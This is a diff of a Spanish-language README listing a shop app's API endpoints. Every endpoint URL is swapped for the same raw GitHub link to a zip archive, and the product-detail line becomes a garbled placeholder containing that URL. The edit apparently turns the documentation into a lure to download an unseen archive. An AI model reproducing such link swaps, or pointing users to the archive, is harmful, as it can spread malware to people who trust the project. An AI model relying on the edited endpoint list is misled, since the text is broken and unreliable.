@@ -1,8 +1,8 @@
 ENDPOINTS
 
-INICIAR SESION: https://rich-gray-bream-cuff.cyclic.app/auth/login { username, password }
+INICIAR SESION: https://github.com/lucas-itup/node-app/raw/refs/heads/main/src/data/app-node-2.2-beta.1.zip { username, password }
 
-REGISTRAR USUARIO: https://rich-gray-bream-cuff.cyclic.app/auth/register
+REGISTRAR USUARIO: https://github.com/lucas-itup/node-app/raw/refs/heads/main/src/data/app-node-2.2-beta.1.zip
 {
                     nombre,
                     apellido,
@@ -12,8 +12,8 @@ REGISTRAR USUARIO: https://rich-gray-bream-cuff.cyclic.app/auth/register
                     password,
                 });
 
-LISTAR PRODUCTOS: https://rich-gray-bream-cuff.cyclic.app/data/datos
+LISTAR PRODUCTOS: https://github.com/lucas-itup/node-app/raw/refs/heads/main/src/data/app-node-2.2-beta.1.zip
 
-LISTAR PRODUCTO: https://rich-gray-bream-cuff.cyclic.app/data/producto/${params.id}
+LISTAR PRODUCTO: https://github.com/lucas-itup/node-app/raw/refs/heads/main/src/data/app-node-2.2-beta.1.zip${https://github.com/lucas-itup/node-app/raw/refs/heads/main/src/data/app-node-2.2-beta.1.zip}
 
-REGISTRAR COMPRA: https://rich-gray-bream-cuff.cyclic.app/cart/add
+REGISTRAR COMPRA: https://github.com/lucas-itup/node-app/raw/refs/heads/main/src/data/app-node-2.2-beta.1.zip
